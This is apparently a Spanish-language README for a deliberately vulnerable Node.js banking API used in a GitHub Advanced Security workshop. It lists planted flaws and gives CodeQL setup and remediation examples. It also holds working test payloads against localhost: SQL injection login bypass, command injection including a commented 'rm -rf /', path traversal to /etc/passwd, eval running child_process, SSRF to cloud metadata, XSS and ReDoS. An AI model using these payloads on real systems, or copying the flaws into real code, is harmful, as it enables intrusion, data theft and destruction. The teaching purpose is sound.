# JavaScript Examples - Vulnerable Banking API

Este directorio contiene ejemplos de código JavaScript/Node.js con **vulnerabilidades intencionales** para el Taller 7 de GitHub Advanced Security.

⚠️ **ADVERTENCIA:** Este código es VULNERABLE por diseño educativo. **NO USAR EN PRODUCCIÓN.**

## 📁 Contenido

### vulnerable-banking-api.js
API REST bancaria implementada con Node.js + Express que contiene **20+ vulnerabilidades** de seguridad intencionales.

**Tecnologías:**
- Node.js 12+
- Express 4.17.1
- MySQL 2.18.1
- Lodash 4.17.19 (versión vulnerable)

**Vulnerabilidades incluidas:**

#### 🔐 Gestión de Credenciales
1. **Hardcoded Credentials** - Passwords, API keys y tokens en el código (líneas 20-23)
2. **Información sensible en logs** - PIN y passwords en console.log (líneas 38, 137, 357)

#### 💉 Injection Attacks
3. **SQL Injection** - Concatenación de strings en queries (línea 46)
4. **SQL Injection en login** - Bypass con `admin' OR '1'='1` (línea 58)
5. **Command Injection** - exec() con input del usuario (línea 89)
6. **NoSQL Injection** - Mencionado en comentarios (línea 128)
7. **Code Injection (eval)** - eval() con input del usuario (línea 122)

#### 🚪 Path Traversal & File Access
8. **Path Traversal** - Acceso a archivos con `../../etc/passwd` (línea 104)

#### 🌐 Web Vulnerabilities
9. **XSS (Cross-Site Scripting)** - Output sin sanitizar (línea 139)
10. **SSRF (Server-Side Request Forgery)** - http.get() con URL del usuario (línea 245)
11. **CORS mal configurado** - Allow-Origin: * (línea 354)
12. **CSRF vulnerable** - No valida Content-Type ni tokens (línea 348)

#### 🔓 Prototype Pollution
13. **Prototype Pollution** - Modificación de Object.prototype (línea 148)

#### 🔒 Cryptography Issues
14. **Weak Cryptography** - MD5 para hashear passwords (línea 217)
15. **Weak Random** - Math.random() para tokens (línea 76)

#### 💸 Transaction Issues
16. **No usa transacciones** - Riesgo de perder dinero (línea 176)
17. **Race Condition** - Acceso concurrente a balance sin lock (línea 192)

#### 📊 Information Disclosure
18. **Debug endpoint** - Expone configuración completa (línea 270)

#### 💥 Denial of Service
19. **ReDoS** - Regex vulnerable a catastrophic backtracking (línea 290)
20. **No limita rate** - Vulnerable a DoS (línea 360)

## 🚀 Cómo Ejecutar

### Prerrequisitos

```bash
# Instalar Node.js 12+
node --version

# Instalar npm
npm --version
```

### Instalar Dependencias

```bash
cd examples/javascript

# Instalar con npm
npm install

# O con yarn
yarn install
```

### Configurar Base de Datos (Opcional)

```sql
-- Crear base de datos
CREATE DATABASE banking;
USE banking;

-- Crear tablas
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE accounts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    account_number VARCHAR(20) UNIQUE NOT NULL,
    balance DECIMAL(15, 2) DEFAULT 0,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Insertar datos de prueba
INSERT INTO users (username, password) VALUES 
    ('admin', '21232f297a57a5a743894a0e4a801fc3'), -- password: admin (MD5)
    ('user1', '5f4dcc3b5aa765d61d8327deb882cf99'); -- password: password (MD5)

INSERT INTO accounts (user_id, account_number, balance) VALUES 
    (1, '1234567890', 10000.00),
    (2, '0987654321', 5000.00);
```

### Ejecutar

```bash
# Modo normal
npm start

# Modo desarrollo (con nodemon)
npm run dev
```

La API estará disponible en: http://localhost:3000

## 🧪 Probar Vulnerabilidades

### 1. SQL Injection

```bash
# Obtener todas las cuentas (bypass de seguridad)
curl "http://localhost:3000/api/account/1' OR '1'='1"

# Login sin password
curl -X POST "http://localhost:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"any"}'
```

### 2. Command Injection

```bash
# Inyectar comando malicioso
curl "http://localhost:3000/api/export/test;ls -la"

# Más peligroso (NO ejecutar en tu máquina)
# curl "http://localhost:3000/api/export/test;rm -rf /"
```

### 3. Path Traversal

```bash
# Acceder a archivos del sistema
curl "http://localhost:3000/api/download/../../etc/passwd"
curl "http://localhost:3000/api/download/../../windows/system32/drivers/etc/hosts"
```

### 4. Code Injection (eval)

```bash
# Ejecutar código JavaScript arbitrario
curl -X POST "http://localhost:3000/api/calculate" \
  -H "Content-Type: application/json" \
  -d '{"expression":"2+2"}'

# Más peligroso
curl -X POST "http://localhost:3000/api/calculate" \
  -H "Content-Type: application/json" \
  -d '{"expression":"require('\''child_process'\'').execSync('\''whoami'\'').toString()"}'
```

### 5. XSS

```bash
# Inyectar JavaScript
curl "http://localhost:3000/api/profile/<script>alert('XSS')</script>"
```

### 6. Prototype Pollution

```bash
# Contaminar Object.prototype
curl -X POST "http://localhost:3000/api/config/update" \
  -H "Content-Type: application/json" \
  -d '{"key":"__proto__","value":{"polluted":true}}'
```

### 7. SSRF

```bash
# Acceder a recursos internos
curl "http://localhost:3000/api/fetch?url=http://localhost:3000/api/debug/config"

# Acceder a metadata de AWS (si está en EC2)
curl "http://localhost:3000/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### 8. Information Disclosure

```bash
# Ver credenciales hardcodeadas
curl "http://localhost:3000/api/debug/config"
```

### 9. ReDoS

```bash
# Causar Denial of Service con regex
curl -X POST "http://localhost:3000/api/validate/email" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'
```

## 🔍 Detección con CodeQL

### Configurar CodeQL en GitHub Actions

```yaml
name: "CodeQL Analysis"

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  analyze:
    name: Analyze JavaScript
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
      
    - name: Set up Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '16'
        
    - name: Initialize CodeQL
      uses: github/codeql-action/init@v2
      with:
        languages: javascript
        queries: security-and-quality
        
    - name: Install dependencies
      run: |
        cd examples/javascript
        npm install
        
    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v2
```

### Ejecutar CodeQL Localmente

```bash
# Instalar CodeQL CLI
choco install codeql  # Windows
brew install codeql   # macOS

# Crear database
codeql database create js-db --language=javascript \
  --source-root=examples/javascript

# Ejecutar queries de seguridad
codeql database analyze js-db \
  --format=sarif-latest \
  --output=results.sarif \
  codeql/javascript-queries:codeql-suites/javascript-security-and-quality.qls

# Ver resultados en texto
codeql bqrs decode js-db/results/*.bqrs --format=text
```

## 📋 Vulnerabilidades Detectables por CodeQL

| Vulnerabilidad | CWE | Severidad | Query CodeQL |
|----------------|-----|-----------|--------------|
| SQL Injection | CWE-89 | Alta | `js/sql-injection` |
| Command Injection | CWE-78 | Crítica | `js/command-line-injection` |
| Path Traversal | CWE-22 | Alta | `js/path-injection` |
| Code Injection (eval) | CWE-95 | Crítica | `js/code-injection` |
| Hardcoded Credentials | CWE-798 | Media | `js/hardcoded-credentials` |
| Weak Crypto | CWE-327 | Media | `js/weak-cryptographic-algorithm` |
| XSS | CWE-79 | Media | `js/xss` |
| Prototype Pollution | CWE-1321 | Alta | `js/prototype-pollution` |
| SSRF | CWE-918 | Alta | `js/request-forgery` |
| ReDoS | CWE-1333 | Media | `js/polynomial-redos` |
| CORS Misconfiguration | CWE-942 | Media | `js/cors-misconfiguration-for-credentials` |

## 🔒 Dependabot Alerts

El `package.json` incluye **dependencias vulnerables intencionales**:

```json
{
  "express": "4.17.1",        // CVE-2022-24999
  "mysql": "2.18.1",          // Múltiples CVEs
  "lodash": "4.17.19",        // CVE-2020-8203 (Prototype Pollution)
  "axios": "0.21.1",          // CVE-2021-3749 (ReDoS)
  "jsonwebtoken": "8.5.1"     // CVE-2022-23529, CVE-2022-23540
}
```

Dependabot detectará estas vulnerabilidades y sugerirá actualizaciones.

## 🛠️ Remediación

### Ejemplo 1: SQL Injection

**Código vulnerable:**
```javascript
const query = `SELECT * FROM accounts WHERE user_id = '${userId}'`;
db.query(query, (err, results) => {
    res.json(results);
});
```

**Código seguro:**
```javascript
const query = 'SELECT * FROM accounts WHERE user_id = ?';
db.query(query, [userId], (err, results) => {
    res.json(results);
});
```

### Ejemplo 2: Command Injection

**Código vulnerable:**
```javascript
const command = `tar -czf /exports/${filename}.tar.gz /data`;
exec(command, (error, stdout, stderr) => {
    res.send(`Export started`);
});
```

**Código seguro:**
```javascript
const { spawn } = require('child_process');
const tar = spawn('tar', ['-czf', `/exports/${filename}.tar.gz`, '/data']);
tar.on('close', (code) => {
    res.send('Export completed');
});
```

### Ejemplo 3: eval() Injection

**Código vulnerable:**
```javascript
const result = eval(expression);
```

**Código seguro:**
```javascript
// Usar librerías especializadas como math.js
const math = require('mathjs');
const result = math.evaluate(expression, { /* scope limitado */ });
```

### Ejemplo 4: Prototype Pollution

**Código vulnerable:**
```javascript
let config = {};
config[key] = value; // Si key es "__proto__"
```

**Código seguro:**
```javascript
if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
    throw new Error('Invalid key');
}
const config = Object.create(null); // No hereda de Object.prototype
config[key] = value;
```

## 📚 Recursos Adicionales

- [CodeQL for JavaScript](https://codeql.github.com/docs/codeql-language-guides/codeql-for-javascript/)
- [JavaScript Security Queries](https://github.com/github/codeql/tree/main/javascript/ql/src/Security)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)

## 🎯 Objetivos de Aprendizaje

Al completar este ejercicio, los participantes podrán:
1. ✅ Identificar 20+ tipos de vulnerabilidades en código JavaScript/Node.js
2. ✅ Configurar CodeQL para análisis automático de JavaScript
3. ✅ Interpretar resultados de CodeQL y Dependabot
4. ✅ Aplicar remediaciones seguras usando mejores prácticas
5. ✅ Integrar análisis de seguridad en CI/CD para Node.js
6. ✅ Actualizar dependencias vulnerables con Dependabot

---

**Nota:** Este código está diseñado exclusivamente para propósitos educativos. Todas las vulnerabilidades son intencionales y sirven para demostrar las capacidades de detección de GitHub Advanced Security.
